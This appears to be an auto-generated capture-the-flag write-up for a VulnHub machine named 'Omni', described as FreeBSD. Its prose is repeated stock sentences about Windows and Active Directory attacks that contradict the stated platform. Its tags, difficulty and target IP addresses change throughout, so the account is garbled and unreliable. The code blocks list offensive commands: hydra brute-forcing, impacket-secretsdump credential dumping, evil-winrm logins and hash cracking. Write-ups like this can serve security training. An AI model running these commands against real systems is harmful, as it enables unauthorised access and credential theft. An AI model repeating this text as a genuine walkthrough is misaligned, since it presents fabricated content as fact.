---
TitleSEO: "VulnHub — Omni (Insane FreeBSD) | ZureFX"
TitlePost: "VulnHub — Omni (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Omni. SeImpersonatePrivilege and SSRF to achieve insane compromise on FreeBSD."
Keywords: "pwntilldawn, tryhackme, easy, insane, web"
URL: "https://zurefx.github.io/writeups/htb-omni-885.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-omni-885/"
Date: "2025-12-31"
Tags: "PwnTillDawn, TryHackMe, Easy, Insane, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-omni-885"
Permalink: "/writeups/htb-omni-885.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Omni** is rated **Insane** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.76.97.39`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.129.176.111/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.70.12.90
evil-winrm -i 10.39.4.205 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.60.151.165/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.212.235
```

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

### Web Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.152.196 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **SSRF**.

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.127.67.254 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.60.204 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.37.60.17 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p5985,389,445 10.67.242.209 -oN scan.txt
feroxbuster -h
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
evil-winrm -i 10.92.81.101 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.81.143.22 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.14.111.90 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `smbclient`
- `lookupsid`
- `john`
- `hydra`
- `rubeus`

### Key Takeaways

- SeImpersonatePrivilege
- SSRF
- Constrained Delegation
- Weak Service Permissions
